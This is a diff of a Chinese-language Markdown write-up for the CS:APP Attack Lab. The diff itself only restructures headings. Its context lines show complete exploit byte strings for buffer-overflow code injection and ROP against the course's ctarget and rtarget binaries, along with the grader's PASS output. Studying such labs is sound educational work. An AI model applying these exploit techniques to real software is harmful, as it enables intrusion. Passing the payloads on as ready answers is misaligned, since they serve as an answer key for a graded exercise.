@@ -1,8 +1,10 @@
-# Attack Lab
+---
+title: Attack Lab
+---
 
-## 问题描述
+# 问题描述
 
-### 设定
+## 设定
 
 现有两个存在 ***缓冲区溢出 (buffer overflow)*** 风险的 x86-64 可执行文件：
 
@@ -10,13 +12,13 @@
 - `rtarget` 可能遭受 ***ROP (return-oriented programming)*** 攻击（对应第 4~5 关）。
 - [此处](http://csapp.cs.cmu.edu/3e/target1.tar)可下载这两个文件。本地运行时应开启 `-q` 选项，以避免连接评分服务器。
 
-### 任务
+## 任务
 
 利用上述漏洞，植入攻击代码，改变程序行为。[此处](http://csapp.cs.cmu.edu/3e/attacklab.pdf)可下载详细说明。
 
-## `ctarget`
+# `ctarget`
 
-### 第一关
+## 第一关
 
 函数 `getbuf()` 的 C 代码和汇编码分别为
 
@@ -110,7 +112,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 30 31 32 33 34 35 36 37 38 39 C0 17 40 00 00 00 00 00 
 ```
 
-### 第二关
+## 第二关
 
 需要植入的指令为：
 ```nasm
@@ -164,7 +166,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:90 90 90 90 90 90 90 90 BF FA 97 B9 59 90 90 90 68 EC 17 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 
 ```
 
-### 第三关
+## 第三关
 
 先用 `man ascii` 查到字符串 `59b997fa` 的十六进制表示：
 
@@ -241,9 +243,9 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:3:6A 00 48 BF 35 39 62 39 39 37 66 61 57 48 89 E7 68 FA 18 40 00 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00
 ```
 
-## `rtarget`
+# `rtarget`
 
-### 第四关
+## 第四关
 
 先用 `objdump -d` 获得 `rtarget` 的编码：
 
@@ -307,7 +309,7 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:rtarget:2:90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
 ```
 
-### 第五关
+## 第五关
 
 在 `start_farm` 与 `end_farm` 之间（可存入 `full_farm.d` 以便检索），编码 `0xc3` 共出现 50 次 —— 可用指令只能取自这 50 处。
 
